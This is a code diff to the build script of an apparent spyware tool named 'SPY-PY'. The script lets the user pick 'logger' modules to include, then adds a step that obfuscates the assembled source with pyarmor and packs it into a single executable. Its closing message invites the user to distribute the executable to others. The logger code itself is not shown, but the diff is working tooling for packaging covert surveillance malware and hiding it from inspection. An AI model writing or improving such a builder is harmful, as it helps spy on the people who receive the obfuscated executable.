@@ -1,6 +1,11 @@
+# TODO: Ask for desired platform (Windows, Linux, MacOS)
+# TODO: read line 58 in main.py and make the necessary changes
+# TODO: Detect pyarmor error if an error occurs while packing the source
+# TODO: Cleanup the code and make it more readable
 import os
 import re
 import requests
+import subprocess
 import shutil
 
 loggers = [
@@ -9,9 +14,7 @@ loggers = [
     if file.endswith(".py") and not file.startswith("__")
 ]
 
-loggers_copy = loggers.copy()
-
-for logger in loggers_copy:
+for logger in loggers:
     choice = (
         input(
             "[SPY-PY BUILDER] Would you like to include the functionality of the "
@@ -184,13 +187,59 @@ def prepare_source():
         print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
 
 try:
-    prepare_source()  # now there is spy-py-temp/assembled.py with the user's input
+    prepare_source()  # now there is spy-py-temp/prepared.py
 except Exception as e:
     print(f"[SPY-PY BUILDER] [ERROR] An error while preparing the source: {e}")
     print(
         f"[SPY-PY BUILDER] [ERROR] An error occured during the build process. Please try again or open an issue on the GitHub repository."
     )
 
-def obfuscate_prepared_source():
-    # TODO use pyarmor to obfuscate the source code
-    pass
+def pack_source():
+    try:
+        subprocess.run("pyarmor -h", shell=True)
+    except Exception as e:
+        print(
+            "[SPY-PY BUILDER] [ERROR] Failed to run 'pyarmor'. Make sure it is installed."
+        )
+        print(
+            "[SPY-PY BUILDER] [INFO] You can install 'pyarmor' by running 'pip install pyarmor'."
+        )
+        return
+
+    obfuscate_command = "pyarmor gen --pack onefile spy-py-temp/prepared.py"
+    try:
+        subprocess.run(obfuscate_command, shell=True)
+    except Exception as e:
+        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while obfuscating the source: {e}")
+        print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
+        return
+    print("[SPY-PY BUILDER] [INFO] Source obfuscation completed successfully.")
+
+try:
+    pack_source()  # now the source is packed into an executable and obfuscated
+except Exception as e:
+    print(f"[SPY-PY BUILDER] [ERROR] An error while obfuscating the source: {e}")
+    print(
+        f"[SPY-PY BUILDER] [ERROR] An error occured during the build process. Please try again or open an issue on the GitHub repository."
+    )
+
+def cleanup():
+    try:
+        shutil.rmtree("spy-py-temp")
+        if os.path.exists("prepared.spec"):
+            os.remove("prepared.spec")
+        if os.path.exists(".pyarmor"):
+            shutil.rmtree(".pyarmor")
+    except Exception as e:
+        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while cleaning up: {e}")
+        print("[SPY-PY BUILDER] [ERROR] Please manually remove the 'spy-py-temp' directory.")
+    print("SPY-PY BUILDER] [INFO] Cleanup completed successfully.")
+
+def finish():
+    print(
+        "[SPY-PY BUILDER] [INFO] The build process has been completed successfully. The executable is located in the 'dist' directory."
+    )
+    print(
+        "[SPY-PY BUILDER] [INFO] You can now run the executable or distribute it to others."
+    )
+    print("[SPY-PY BUILDER] [INFO] Thank you for using SpyPy.")
